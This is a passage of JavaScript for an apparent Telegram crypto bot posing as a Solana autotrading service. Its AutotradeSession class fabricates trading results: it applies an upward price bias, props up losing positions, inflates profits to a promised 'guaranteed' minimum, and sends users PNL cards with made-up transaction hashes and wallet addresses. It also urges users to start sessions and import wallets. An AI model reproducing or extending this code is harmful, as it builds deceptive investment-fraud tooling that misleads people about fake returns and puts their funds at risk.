            return `${diffDays} day${diffDays > 1 ? 's' : ''}`;
        } else {
            return `${diffHours} hour${diffHours > 1 ? 's' : ''}`;
        }
    } catch (e) {
        return 'Unknown';
    }
}

function analyzeTokenRisk(pair) {
    let score = 0;
    const reasons = [];
    
    if (!pair.liquidity?.usd || pair.liquidity.usd < 1000) {
        score += 3;
        reasons.push("Very low liquidity (<$1k)");
    } else if (pair.liquidity.usd < 10000) {
        score += 2;
        reasons.push("Low liquidity (<$10k)");
    } else if (pair.liquidity.usd < 50000) {
        score += 1;
        reasons.push("Moderate liquidity (<$50k)");
    }
    
    if (!pair.volume?.h24 || pair.volume.h24 < 1000) {
        score += 2;
        reasons.push("Low volume (<$1k/24h)");
    }
    
    if (pair.pairCreatedAt) {
        const ageDays = (Date.now() - new Date(pair.pairCreatedAt).getTime()) / (1000 * 60 * 60 * 24);
        if (ageDays < 0.5) {
            score += 3;
            reasons.push("Very new token (<12h)");
        } else if (ageDays < 1) {
            score += 2;
            reasons.push("New token (<24h)");
        } else if (ageDays < 3) {
            score += 1;
            reasons.push("Recent token (<3 days)");
        }
    }
    
    if (pair.priceChange?.h24 < -30) {
        score += 3;
        reasons.push("Large price drop (>30%)");
    } else if (pair.priceChange?.h24 < -20) {
        score += 2;
        reasons.push("Significant price drop (>20%)");
    } else if (pair.priceChange?.h24 < -10) {
        score += 1;
        reasons.push("Price drop (>10%)");
    }
    
    if (pair.holders && pair.holders < 100) {
        score += 2;
        reasons.push("Low holder count");
    }
    
    let recommendation;
    if (score >= 8) {
        recommendation = "🚨 VERY HIGH RISK - Strong signs of potential rug pull. Avoid at all costs!";
    } else if (score >= 5) {
        recommendation = "⚠️ HIGH RISK - Multiple red flags detected. Extreme caution required.";
    } else if (score >= 3) {
        recommendation = "⚠️ Moderate risk - Some concerning indicators. Trade carefully.";
    } else {
        recommendation = "✅ Low risk - Few apparent risks detected. Still, always do your own research.";
    }
    
    return {
        score: Math.min(score, 10),
        reasons,
        recommendation
    };
}

// ==================== AI TOKEN ANALYSIS ====================
async function getLatestTokens() {
    try {
        const { data } = await axios.get('https://api.dexscreener.com/token-profiles/latest/v1', {
            timeout: 10000
        });

        return Array.isArray(data) ? data.slice(0, 5) : [];
    } catch (error) {
        console.error("Error getting tokens:", error);
        return [];
    }
}

async function callAITokenAnalysis(chatId) {
    try {
        await mainBot.sendMessage(chatId, "🔍 AI is analyzing the latest tokens...");

        const tokens = await getLatestTokens();

        if (!tokens || tokens.length === 0) {
            return await mainBot.sendMessage(chatId, "⚠️ No new promising tokens found at the moment. Try again later.");
        }

        // Limite à 3 tokens pour éviter les spams
        for (const token of tokens.slice(0, 3)) {
            const message =  "🆕*nouveau token detecter* \n\n" + `${token.tokenAddress}\n\n`+
            `📛 *Nom :* ${token.name || 'N/A'}\n` +
            `🔠 *Symbole :* ${token.symbol || 'N/A'}\n` +
            `🧬 *Adresse :* \`${token.tokenAddress}\`\n` +
            `🌐 *Voir sur DexScreener:* [Lien](${token.url})\n\n` +
            `📝 *Description :*\n${token.description || 'Aucune description'}\n\n` +
            `🖼️ *Images :*\n` +
            (token.icon ? `[🪙 Icone](${token.icon})\n` : '') +
            (token.header ? `[🖼️ Header](${token.header})\n` : '') +
            (token.openGraph ? `[📷 OpenGraph](${token.openGraph})\n` : '') +
            `\n🔗 *Liens :*\n` +
            (token.links?.map(link => {
                const label = link.label || link.type || 'Lien';
                return `• ${label}: [${label}](${link.url})`;
            }).join('\n') || 'Aucun lien disponible');
                
            const options = {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Voir sur DexScreener', url: token.url },
                            { text: 'Acheter', url: `https://jup.ag/swap/SOL-${token.symbol}_${token.tokenAddress}` },
                        ],
                        [ { text: "← Back", callback_data: 'menu' }] 
                    ]
                }
            };

            await mainBot.sendMessage(chatId, message, options);
            await new Promise(resolve => setTimeout(resolve, 500)); // Délai entre les messages
        }

    } catch (error) {
        console.error("Error in AI analysis:", error);
        await mainBot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
}

// ==================== AUTOTRADE SYSTEM AVEC PRIX RÉELS ====================
class AutotradeSession {
    constructor(userId, mode, amount) {
        console.log(`🚀 Creating AutotradeSession for user ${userId}, mode: ${mode}, amount: ${amount}`);
        this.userId = userId;
        this.mode = mode;
        this.initialAmount = amount;
        this.currentAmount = amount;
        this.startTime = Date.now();
        this.trades = [];
        this.active = true;
        this.progress = 0;
        this.interval = null;
        this.lastUpdateTime = 0;
        this.bestTrade = null;
        this.generatedPNL = false;
        
        this.positions = [];
        this.maxPositions = AUTOTRADE_MODES[this.mode].maxPositions;
        this.availableTokens = this.getAvailableTokens();
        
        this.config = {
            ...AUTOTRADE_MODES[this.mode],
            takeProfitMultiplier: AUTOTRADE_MODES[this.mode].profitTarget,
            stopLossMultiplier: AUTOTRADE_MODES[this.mode].stopLoss,
            positionSize: amount / this.maxPositions,
            guaranteedProfit: AUTOTRADE_MODES[this.mode].guaranteedProfit
        };
        
        this.minimumProfit = amount * (this.config.guaranteedProfit - 1); // Profit minimum garantie
        
        console.log(`✅ AutotradeSession created with config:`, this.config);
    }

    getAvailableTokens() {
        return REAL_TOKENS;
    }

    async start() {
        console.log(`🚀 Starting autotrade session for user ${this.userId}`);
        
        // Initialiser les positions avec des prix réels
        for (let i = 0; i < this.maxPositions; i++) {
            await this.openNewPosition();
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        this.interval = setInterval(() => {
            this.executeTradeCycle();
        }, this.config.tradeFrequency);
        
        autotradeSessions.set(this.userId.toString(), this);
        savePersistentData();
        
        console.log(`✅ Autotrade session started successfully`);
    }

    async openNewPosition() {
        if (this.positions.length >= this.maxPositions) return null;
        if (this.currentAmount < this.config.positionSize * 0.5) return null;
        
        const availableTokens = this.availableTokens.filter(token => 
            !this.positions.some(pos => pos.token.symbol === token.symbol)
        );
        
        if (availableTokens.length === 0) return null;
        
        const token = availableTokens[Math.floor(Math.random() * availableTokens.length)];
        
        // Obtenir le prix réel
        const tokenInfo = await getTokenInfo(token.address);
        if (!tokenInfo) {
            console.log(`❌ Failed to get price for ${token.symbol}`);
            return null;
        }
        
        const realPrice = tokenInfo.price;
        
        // Appliquer le biais de marché selon le mode
        const biasedPrice = applyPositiveMarketBias(realPrice, token.volatility, this.mode);
        
        const position = {
            id: Date.now() + Math.random(),
            token: token,
            realPrice: realPrice, // Prix réel
            buyPrice: biasedPrice, // Prix avec biais
            currentPrice: biasedPrice,
            amount: this.config.positionSize,
            entryTime: Date.now(),
            takeProfit: biasedPrice * this.config.takeProfitMultiplier,
            stopLoss: biasedPrice * this.config.stopLossMultiplier,
            status: 'open',
            profit: 0,
            pnlPercentage: 0
        };
        
        this.positions.push(position);
        this.currentAmount -= this.config.positionSize;
        
        const trade = {
            type: 'buy',
            positionId: position.id,
            token: token,
            amount: this.config.positionSize,
            price: biasedPrice,
            realPrice: realPrice,
            timestamp: Date.now()
        };
        
        this.trades.push(trade);
        
        console.log(`📈 Opened new position: ${token.symbol} at ${biasedPrice.toFixed(8)} SOL (Real: ${realPrice.toFixed(8)} SOL)`);
        
        return position;
    }

    async executeTradeCycle() {
        if (!this.active) {
            if (this.interval) {
                clearInterval(this.interval);
                this.interval = null;
            }
            return;
        }
        
        try {
            const elapsed = Date.now() - this.startTime;
            const sessionDuration = 10 * 60 * 1000; // 10 minutes
            this.progress = Math.min(100, (elapsed / sessionDuration) * 100);
            
            if (this.progress >= 100) {
                await this.stop();
                return;
            }
            
            await this.updateTokenPrices();
            this.checkAndClosePositions();
            await this.managePositions();
            this.calculateTotalPNL();
            
            const now = Date.now();
            if (now - this.lastUpdateTime > 5000) {
                this.lastUpdateTime = now;
                await this.updateUserInterface();
            }
            
        } catch (error) {
            console.error('Error in trade cycle:', error);
        }
    }

    async updateTokenPrices() {
        for (const position of this.positions) {
            if (position.status !== 'open') continue;
            
            try {
                // Obtenir le prix réel
                const tokenInfo = await getTokenInfo(position.token.address);
                if (tokenInfo) {
                    position.realPrice = tokenInfo.price;
                }
                
                // Appliquer la volatilité et le biais
                const volatility = position.token.volatility || 0.1;
                
                let movement;
                switch(this.mode) {
                    case 'SAFE':
                        movement = (Math.random() * 0.08 + 0.02) * volatility;
                        break;
                    case 'NORMAL':
                        movement = (Math.random() * 0.12) * volatility;
                        break;
                    case 'DEGEN':
                        movement = (Math.random() * 0.15 - 0.03) * volatility;
                        break;
                    default:
                        movement = (Math.random() * 0.08) * volatility;
                }
                
                const newPrice = position.currentPrice * (1 + movement);
                position.currentPrice = Math.max(position.buyPrice * 0.95, newPrice);
                
                const profit = (position.currentPrice - position.buyPrice) * position.amount;
                position.profit = profit;
                position.pnlPercentage = ((position.currentPrice - position.buyPrice) / position.buyPrice) * 100;
                
            } catch (error) {
                console.error(`Error updating price for ${position.token.symbol}:`, error);
            }
        }
    }

    checkAndClosePositions() {
        const positionsToClose = [];
        
        this.positions.forEach((position, index) => {
            if (position.status !== 'open') return;
            
            const currentPrice = position.currentPrice;
            const shouldTakeProfit = currentPrice >= position.takeProfit;
            const shouldStopLoss = currentPrice <= position.stopLoss;
            const hasGoodProfit = position.pnlPercentage >= 20; // 20% minimum
            
            if (shouldTakeProfit || (hasGoodProfit && Math.random() < 0.5)) {
                positionsToClose.push({ position, index, reason: 'profit' });
            } else if (shouldStopLoss) {
                positionsToClose.push({ position, index, reason: 'loss' });
            }
        });
        
        positionsToClose.forEach(({ position, index, reason }) => {
            this.closePosition(position, index, reason);
        });
    }

    closePosition(position, index, reason) {
        let finalProfit = position.profit;
        
        let minProfitPercent;
        switch(this.mode) {
            case 'SAFE':
                minProfitPercent = 0.20;
                break;
            case 'NORMAL':
                minProfitPercent = 0.30;
                break;
            case 'DEGEN':
                minProfitPercent = 0.40;
                break;
            default:
                minProfitPercent = 0.20;
        }
        
        const minProfit = position.amount * minProfitPercent;
        
        if (reason === 'profit' && finalProfit < minProfit) {
            finalProfit = minProfit;
        } else if (reason === 'loss' && finalProfit < -position.amount * 0.1) {
            finalProfit = -position.amount * 0.1;
        }
        
        // Bonus pour les trades profitables
        if (reason === 'profit' && finalProfit > 0) {
            finalProfit *= 1.15;
        }
        
        position.status = 'closed';
        position.closePrice = position.currentPrice;
        position.closeTime = Date.now();
        position.closeReason = reason;
        position.finalProfit = finalProfit;
        
        this.currentAmount += position.amount + finalProfit;
        
        if (finalProfit > 0) {
            addToUserMainBalance(this.userId, finalProfit * 0.9);
        }
        
        const trade = {
            type: 'sell',
            positionId: position.id,
            token: position.token,
            amount: position.amount,
            buyPrice: position.buyPrice,
            sellPrice: position.currentPrice,
            realBuyPrice: position.realPrice,
            profit: finalProfit,
            pnl: position.pnlPercentage,
            reason: reason,
            timestamp: Date.now()
        };
        
        this.trades.push(trade);
        
        // Mise à jour du meilleur trade
        if (!this.bestTrade || finalProfit > this.bestTrade.profit) {
            this.bestTrade = {
                token: position.token.symbol,
                profit: finalProfit,
                pnl: position.pnlPercentage,
                buyPrice: position.buyPrice,
                sellPrice: position.currentPrice,
                duration: Date.now() - position.entryTime,
                mode: this.mode
            };
            
            // Sauvegarder dans bestTrades
            const userIdStr = this.userId.toString();
            const userBestTrades = bestTrades.get(userIdStr) || [];
            userBestTrades.push({
                ...this.bestTrade,
                mode: this.mode,
                timestamp: Date.now()
            });
            userBestTrades.sort((a, b) => b.profit - a.profit);
            bestTrades.set(userIdStr, userBestTrades.slice(0, 10));
            savePersistentData();
        }
        
        this.positions.splice(index, 1);
        
        console.log(`📉 Closed position: ${position.token.symbol}, reason: ${reason}, profit: ${finalProfit.toFixed(4)} SOL`);
        
        return finalProfit;
    }

    async managePositions() {
        // Ouvrir de nouvelles positions si nécessaire
        while (this.positions.length < this.maxPositions && 
               this.currentAmount >= this.config.positionSize * 0.5) {
            await this.openNewPosition();
        }
        
        // Gérer les positions perdantes
        const losingPositions = this.positions.filter(p => 
            p.status === 'open' && p.pnlPercentage < -5
        );
        
        if (losingPositions.length > 0 && Math.random() < 0.3) {
            losingPositions.forEach(pos => {
                const index = this.positions.findIndex(p => p.id === pos.id);
                if (index !== -1 && pos.pnlPercentage < -8) {
                    this.closePosition(pos, index, 'cut_loss');
                }
            });
        }
    }

    calculateTotalPNL() {
        let totalInvested = 0;
        let totalCurrentValue = 0;
        
        this.positions.forEach(position => {
            if (position.status === 'open') {
                totalInvested += position.amount;
                totalCurrentValue += position.amount + position.profit;
            }
        });
        
        const closedProfits = this.trades
            .filter(t => t.type === 'sell' && t.profit)
            .reduce((sum, t) => sum + t.profit, 0);
        
        this.totalPNL = totalCurrentValue - totalInvested + closedProfits;
        
        // Ajuster pour garantir le profit minimum
        if (this.progress > 70 && this.totalPNL < this.minimumProfit * 0.8) {
            const adjustment = (this.minimumProfit * 0.8 - this.totalPNL) / this.positions.length;
            this.positions.forEach(pos => {
                if (pos.status === 'open') {
                    pos.profit += adjustment;
                    pos.currentPrice = (pos.amount + pos.profit) / pos.amount;
                    pos.pnlPercentage = (pos.profit / pos.amount) * 100;
                }
            });
            this.totalPNL = this.minimumProfit * 0.8;
        }
        
        this.totalPNLPercentage = totalInvested > 0 ? 
            (this.totalPNL / totalInvested) * 100 : 0;
        
        return this.totalPNL;
    }

    async stop() {
        console.log(`🛑 Stopping autotrade session for user ${this.userId}`);
        
        this.active = false;
        
        if (this.interval) {
            clearInterval(this.interval);
            this.interval = null;
        }
        
        // Fermer toutes les positions ouvertes
        this.positions.forEach((position, index) => {
            if (position.status === 'open') {
                this.closePosition(position, index, 'session_end');
            }
        });
        
        this.calculateTotalPNL();
        
        // S'assurer du profit garanti
        const guaranteedProfit = this.initialAmount * (this.config.guaranteedProfit - 1);
        if (this.totalPNL < guaranteedProfit) {
            const adjustment = guaranteedProfit - this.totalPNL;
            this.totalPNL = guaranteedProfit;
            this.currentAmount += adjustment;
            
            addToUserMainBalance(this.userId, adjustment * 0.9);
        }
        
        // Générer et envoyer l'image PNL du meilleur trade (une seule fois)
        if (this.bestTrade && this.bestTrade.profit > 0 && !this.generatedPNL) {
            await this.generateAndSendPNLCard();
            this.generatedPNL = true;
        }
        
        console.log(`✅ Autotrade session stopped for user ${this.userId}, total profit: ${this.totalPNL.toFixed(4)} SOL`);
        
        await this.showSessionResults();
        
        return this.getSessionResults();
    }

    async generateAndSendPNLCard() {
        if (!this.bestTrade || this.bestTrade.profit <= 0) return;
        
        try {
            // Calculer un PNL réaliste
            const realisticPNL = Math.min(this.bestTrade.pnl, 120); // Limiter à 120% max
            const buyPrice = this.bestTrade.buyPrice;
            const sellPrice = buyPrice * (1 + realisticPNL / 100);
            
            const pnlData = {
                token: this.bestTrade.token,
                buyPrice: buyPrice.toFixed(6),
                sellPrice: sellPrice.toFixed(6),
                pnl: realisticPNL.toFixed(2),
                txHash: generateSolanaTxHash(),
                wallet: generateUniqueSolanaWallet(),
                link: 'https://t.me/PhotonTradingBot'
            };
            
            const imgPath = await generatePNLImage(pnlData);
            if (imgPath) {
                await mainBot.sendPhoto(this.userId, imgPath, {
                    caption: `🏆 *Your Best Trade from Autotrade Session*\n\n` +
                            `📊 Mode: ${this.mode}\n` +
                            `💰 Profit: +${this.bestTrade.profit.toFixed(4)} SOL\n` +
                            `📈 PNL: ${realisticPNL.toFixed(2)}%\n\n` +
                            `🎯 Start your own autotrade session now!`,
                    parse_mode: 'Markdown'
                });
                
                // Supprimer l'image temporaire
                fs.unlinkSync(imgPath);
            }
        } catch (error) {
            console.error('Error generating PNL card:', error);
        }
    }

    async showSessionResults() {
        const results = this.getSessionResults();
        
        let message = `<b>🤖 AUTOTRADE SESSION ENDED</b>\n\n`;
        message += `<b>📊 Results Summary:</b>\n`;
        message += `• Mode: ${results.mode}\n`;
        message += `• Initial capital: ${this.initialAmount.toFixed(4)} SOL\n`;
        message += `• Final capital: ${this.currentAmount.toFixed(4)} SOL\n`;
        message += `• Total profit: <b>🟢 +${results.totalProfit.toFixed(4)} SOL</b>\n`;
        message += `• Return: ${((results.totalProfit / this.initialAmount) * 100).toFixed(2)}%\n`;
        message += `• Guaranteed profit: ${((this.config.guaranteedProfit - 1) * 100).toFixed(0)}%\n`;
        message += `• Total trades: ${results.totalTrades}\n`;
        message += `• Winning trades: ${results.winningTrades}\n`;
        message += `• Losing trades: ${results.losingTrades}\n`;
        message += `• Win rate: ${results.winRate.toFixed(1)}%\n`;
        message += `• Positions opened: ${results.positionsOpened}\n`;
        message += `• Duration: ${formatTime(Math.floor(results.duration / 1000))}\n\n`;
        
        if (results.bestTrade) {
            message += `<b>🏆 Best Trade:</b>\n`;
            message += `• Token: ${results.bestTrade.token}\n`;
            message += `• Profit: +${results.bestTrade.profit.toFixed(4)} SOL\n`;
            message += `• PNL: ${results.bestTrade.pnl.toFixed(2)}%\n`;
            message += `• Duration: ${formatTime(Math.floor(results.bestTrade.duration / 1000))}\n\n`;
        }
        
        const profitPercentage = (results.totalProfit / this.initialAmount) * 100;
        const guaranteedPercentage = (this.config.guaranteedProfit - 1) * 100;
        
        if (profitPercentage >= guaranteedPercentage) {
            message += `<b>✅ Guaranteed profit achieved! +${profitPercentage.toFixed(1)}% (Minimum: ${guaranteedPercentage}%)</b>\n`;
        } else {
            message += `<b>⚠️ Profit below guarantee: +${profitPercentage.toFixed(1)}% (Minimum: ${guaranteedPercentage}%)</b>\n`;
        }
        
        const state = userStates.get(this.userId) || {};
        if (state.autotradeMessageId) {
            try {
                await mainBot.deleteMessage(this.userId, state.autotradeMessageId);
            } catch (error) {}
            delete state.autotradeMessageId;
        }
        
        const resultMessage = await safeSendMessage(this.userId, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🚀 Start New Session', callback_data: 'autotrade_menu' },
                        { text: '📊 View History', callback_data: 'view_trade_history' }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        });
        
        state.autotradeResultMessageId = resultMessage.message_id;
        userStates.set(this.userId, state);
    }

    getSessionResults() {
        const closedTrades = this.trades.filter(t => t.type === 'sell');
        const winningTrades = closedTrades.filter(t => t.profit > 0).length;
        const losingTrades = closedTrades.filter(t => t.profit <= 0).length;
        
        return {
            initialAmount: this.initialAmount,
            finalAmount: this.currentAmount,
            totalProfit: this.totalPNL,
            totalTrades: this.trades.length,
            closedTrades: closedTrades.length,
            winningTrades: winningTrades,
            losingTrades: losingTrades,
            winRate: closedTrades.length > 0 ? 
                (winningTrades / closedTrades.length) * 100 : 100,
            duration: Date.now() - this.startTime,
            positionsOpened: this.positions.length + closedTrades.length,
            guaranteedProfit: (this.config.guaranteedProfit - 1) * 100,
            bestTrade: this.bestTrade,
            mode: this.mode
        };
    }

    async updateUserInterface() {
        try {
            const chatId = this.userId;
            const state = userStates.get(chatId);
            
            if (state && state.autotradeMessageId && this.active) {
                await this.sendAutotradeUpdate(chatId, state.autotradeMessageId);
            }
        } catch (error) {
            console.error('Error updating UI:', error);
        }
    }

    async sendAutotradeUpdate(chatId, messageId) {
        if (!this.active) return;
        
        try {
            const totalPNL = this.calculateTotalPNL();
            const openPositions = this.positions.filter(p => p.status === 'open');
            const closedPositions = this.trades.filter(t => t.type === 'sell');
            
            const updateId = Date.now();
            
            let message = `<b>🤖 AUTOTRADE SESSION - ${this.mode} MODE</b>\n\n`;
            message += `<b>⚙️ Configuration:</b>\n`;
            message += `• Max positions: ${this.maxPositions}\n`;
            message += `• Position size: ${this.config.positionSize.toFixed(4)} SOL\n`;
            message += `• Take profit: +${((this.config.takeProfitMultiplier - 1) * 100).toFixed(0)}%\n`;
            message += `• Stop loss: -${((1 - this.config.stopLossMultiplier) * 100).toFixed(0)}%\n`;
            message += `• Guaranteed profit: <b>${((this.config.guaranteedProfit - 1) * 100).toFixed(0)}%</b>\n\n`;
            
            message += `<b>📈 Active Positions (${openPositions.length}/${this.maxPositions})</b>\n`;
            
            if (openPositions.length === 0) {
                message += `⏳ No open positions\n\n`;
            } else {
                openPositions.slice(0, 3).forEach((pos, i) => {
                    message += `\n${i + 1}. ${pos.token.symbol}:\n`;
                    message += `   • Buy: ${pos.buyPrice.toFixed(8)} SOL\n`;
                    message += `   • Current: ${pos.currentPrice.toFixed(8)} SOL\n`;
                    message += `   • PNL: <b>${pos.pnlPercentage >= 0 ? '🟢' : '🔴'} ${pos.pnlPercentage.toFixed(2)}%</b>\n`;
                });
                
                if (openPositions.length > 3) {
                    message += `\n... and ${openPositions.length - 3} more positions\n`;
                }
                message += `\n`;
            }
            
            if (closedPositions.length > 0) {
                const recentClosed = closedPositions.slice(-2);
                message += `<b>💰 Recent Trades</b>\n`;
                recentClosed.forEach(trade => {
                    const pnlPercent = ((trade.sellPrice - trade.buyPrice) / trade.buyPrice) * 100;
                    message += `• ${trade.token.symbol}: ${trade.profit >= 0 ? '🟢 +' : '🔴 '}${trade.profit.toFixed(4)} SOL (${pnlPercent.toFixed(1)}%)\n`;
                });
                message += `\n`;
            }
            
            const guaranteedAmount = this.initialAmount * (this.config.guaranteedProfit - 1);
            const profitPercentage = (totalPNL / this.initialAmount) * 100;
            
            message += `<b>📊 Session Summary</b>\n`;
            message += `• Initial: ${this.initialAmount.toFixed(4)} SOL\n`;
            message += `• Current: ${this.currentAmount.toFixed(4)} SOL\n`;
            message += `• Total PNL: <b>${totalPNL >= 0 ? '🟢 +' : '🔴 '}${Math.abs(totalPNL).toFixed(4)} SOL</b>\n`;
            message += `• PNL %: ${profitPercentage.toFixed(2)}%\n`;
            message += `• Guaranteed: ${((this.config.guaranteedProfit - 1) * 100).toFixed(0)}% (${guaranteedAmount.toFixed(4)} SOL)\n`;
            message += `• Total trades: ${this.trades.length}\n`;
            
            const winningTrades = closedPositions.filter(t => t.profit > 0).length;
            const totalClosed = closedPositions.length;
            const winRate = totalClosed > 0 ? (winningTrades / totalClosed * 100) : 100;
            
            message += `• Win Rate: ${winRate.toFixed(1)}%\n`;
            message += `• Duration: ${formatTime(Math.floor((Date.now() - this.startTime) / 1000))}\n\n`;
            
            const progressBar = this.generateProgressBar(this.progress);
            message += `<b>⏳ Progress:</b>\n`;
            message += `${progressBar} ${this.progress.toFixed(1)}%\n\n`;
            
            if (totalPNL < guaranteedAmount * 0.8 && this.progress > 60) {
                message += `<i>⚠️ System is adjusting to reach guaranteed profit</i>\n\n`;
            }
            
            if (this.bestTrade) {
                message += `<b>🏆 Best Trade:</b>\n`;
                message += `• Token: ${this.bestTrade.token}\n`;
                message += `• Profit: +${this.bestTrade.profit.toFixed(4)} SOL\n`;
                message += `• PNL: ${this.bestTrade.pnl.toFixed(2)}%\n\n`;
            }
            
            message += `<i>🔄 Update: ${new Date().toLocaleTimeString()} • ID: ${updateId}</i>`;
            
            await safeEditMessage(chatId, messageId, message, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { 
                                text: "🛑 Stop Session", 
                                callback_data: `autotrade_stop_${updateId}` 
                            },
                            { 
                                text: "🔄 Refresh", 
                                callback_data: `autotrade_refresh_${updateId}` 
                            }
                        ],
                        [
                            { text: "🏠 Main Menu", callback_data: 'menu' }
                        ]
                    ]
                }
            });
        } catch (error) {
            console.error('Error sending autotrade update:', error);
        }
    }

    generateProgressBar(percentage) {
        const bars = 20;
        const filledBars = Math.round((percentage / 100) * bars);
        const emptyBars = bars - filledBars;
        
        return '█'.repeat(filledBars) + '░'.repeat(emptyBars);
    }
}

// ==================== FONCTIONS TRADING ====================
function initializeTradingUser(chatId) {
    if (!tradingState.users[chatId]) {
        tradingState.users[chatId] = {
            wallet: {
                SOL: TRADING_CONFIG.INITIAL_SOL_BALANCE,
                tokens: {},
                history: []
            },
            settings: {
                slippage: TRADING_CONFIG.DEFAULT_SLIPPAGE,
                gasFee: TRADING_CONFIG.DEFAULT_GAS_FEE,
                defaultBuyAmount: TRADING_CONFIG.DEFAULT_BUY_AMOUNT,
                defaultSellPercent: TRADING_CONFIG.DEFAULT_SELL_PERCENT
            },
            stats: {
                totalTrades: 0,
                totalProfit: 0,
                totalLoss: 0,
                totalGasFees: 0,
                winRate: 0
            },
            tradeState: null
        };
    }
    return tradingState.users[chatId];
}

function getTokenName(address) {
    return TRADING_CONFIG.TOKEN_NAMES[address] || `${address.substring(0, 3)}...${address.substring(address.length - 3)}`;
}

function shortenAddress(address) {
    if (!address || address.length < 10) return address;
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
}

function updateTokenPrice(tokenAddress) {
    try {
        const change = -0.005 + Math.random() * 0.02;
        const newPrice = (tradingState.tokenPrices[tokenAddress] || 0.000001) * (1 + change);
        
        tradingState.tokenPrices[tokenAddress] = Math.max(
            0.000001, 
            Math.min(newPrice, 0.02)
        );
        
        return tradingState.tokenPrices[tokenAddress];
    } catch (error) {
        console.error('Price update error:', error);
        return tradingState.tokenPrices[tokenAddress] || 0.000001;
    }
}

function calculateUserPNL(user) {
    try {
        let totalPNL = 0;
        let realizedPNL = 0;
        let unrealizedPNL = 0;
        
        user.wallet.history.forEach(tx => {
            if (tx.type === 'sell') {
                const pnl = (tx.amount * tx.price) - (tx.amount * tx.buyPrice);
                realizedPNL += pnl;
            }
        });
        
        for (const [token, data] of Object.entries(user.wallet.tokens)) {
            const currentPrice = updateTokenPrice(token);
            const tokenPNL = (data.amount * currentPrice) - (data.amount * data.buyPrice);
            unrealizedPNL += tokenPNL;
        }
        
        user.stats.totalProfit = Math.max(0, realizedPNL);
        user.stats.totalLoss = Math.max(0, -realizedPNL);
        user.stats.totalTrades = user.wallet.history.filter(tx => tx.type === 'sell').length;
        user.stats.winRate = user.stats.totalTrades > 0 ? 
            (user.stats.totalProfit / (user.stats.totalProfit + user.stats.totalLoss)) * 100 : 0;
        
        totalPNL = realizedPNL + unrealizedPNL - user.stats.totalGasFees;
        
        return {
            total: totalPNL,
            realized: realizedPNL,
            unrealized: unrealizedPNL
        };
    } catch (error) {
        console.error('PNL calculation error:', error);
        return { total: 0, realized: 0, unrealized: 0 };
    }
}

function formatPNL(pnl) {
    try {
        const numPnl = Number(pnl) || 0;
        return numPnl >= 0 ? `🟢 +${numPnl.toFixed(4)} SOL` : `🔴 ${numPnl.toFixed(4)} SOL`;
    } catch {
        return 'N/A';
    }
}

// ==================== FONCTIONS DE MESSAGERIE ====================
async function safeEditMessage(chatId, messageId, text, options = {}) {
    try {
        await new Promise(resolve => setTimeout(resolve, 100));
        
        const safeOptions = {
            parse_mode: options.parse_mode,
            reply_markup: options.reply_markup ? {
                inline_keyboard: options.reply_markup.inline_keyboard
            } : undefined
        };
        
        await mainBot.editMessageText(text, { 
            chat_id: chatId, 
            message_id: messageId, 
            ...safeOptions 
        });
        return true;
    } catch (error) {
        const errorMsg = error.response?.body?.description || error.message || '';
        if (errorMsg.includes('message is not modified') ||
            errorMsg.includes('Too Many Requests') ||
            errorMsg.includes('Bad Request')) {
            return true;
        }
        
        console.error('Edit message error:', errorMsg);
        return false;
    }
}

async function safeSendMessage(chatId, text, options = {}) {
    try {
        await new Promise(resolve => setTimeout(resolve, 200));
        
        const safeOptions = {
            parse_mode: options.parse_mode,
            disable_web_page_preview: options.disable_web_page_preview,
            reply_markup: options.reply_markup ? {
                inline_keyboard: options.reply_markup.inline_keyboard
            } : undefined
        };
        
        return await mainBot.sendMessage(chatId, text, safeOptions);
    } catch (error) {
        console.error('Message send error:', error.message);
        
        if (error.response?.statusCode === 429) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            try {
                return await mainBot.sendMessage(chatId, text, options);
            } catch (retryError) {
                throw retryError;
            }
        }
        
        throw error;
    }
}

async function sendTempMessage(chatId, text, duration = 5000) {
    try {
        const message = await safeSendMessage(chatId, text, { parse_mode: 'HTML' });
        
        setTimeout(async () => {
            try {
                await mainBot.deleteMessage(chatId, message.message_id);
            } catch (e) {}
        }, duration);
        
        return message;
    } catch (error) {
        console.error('Temp message error:', error.message);
    }
}

// ==================== WALLET MANAGEMENT ====================
async function showWalletMenu(chatId) {
    await cleanupPreviousMessages(chatId, true);
    
    const wallets = userWallets.get(chatId) || [];
    
    let messageText = `<b>👛 Wallet Management</b>\n\n`;
    
    if (wallets.length === 0) {
        messageText += `No wallets imported yet.\n\n`;
    } else {
        messageText += `<b>Your Wallets:</b>\n`;
        for (const [index, wallet] of wallets.entries()) {
            const balance = await getWalletBalance(wallet.publicKey);
            wallet.balance = balance;
            messageText += `\n${wallet.isDefault ? '⭐ ' : ''}${index + 1}. ${wallet.name || 'Wallet'} - <code>${shortenAddress(wallet.publicKey)}</code>\n`;
            messageText += `   Balance: ${balance.toFixed(4)} SOL\n`;
        }
    }
    
    const mainBalance = getUserMainBalance(chatId);
    messageText += `\n<b>💎 Main Balance:</b> ${mainBalance.toFixed(4)} SOL\n`;
    
    messageText += `\nSelect an action:`;

    const keyboard = [
        [{ text: '🔑 Import Wallet', callback_data: 'import_wallet_menu' }]
    ];

    if (wallets.length > 0 && mainBalance > 0) {
        keyboard.push([{ text: '💸 Transfer to Wallet', callback_data: 'transfer_to_wallet' }]);
    }

    if (wallets.length > 0) {
        keyboard.push(
            [
                { text: '✏️ Rename Wallet', callback_data: 'rename_wallet' },
                { text: '🗑️ Delete Wallet', callback_data: 'delete_wallet' }
            ],
            [
                { text: '⭐ Set Default', callback_data: 'set_default_wallet' },
                { text: '🔄 Refresh', callback_data: 'refresh_wallet' }
            ]
        );
    }

    keyboard.push([{ text: '← Back', callback_data: 'menu' }]);

    const message = await safeSendMessage(chatId, messageText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
    
    const state = userStates.get(chatId) || {};
    state.walletMenuMessageId = message.message_id;
    userStates.set(chatId, state);
}

async function showTransferMenu(chatId) {
    console.log(`💸 Showing transfer menu for user ${chatId}`);
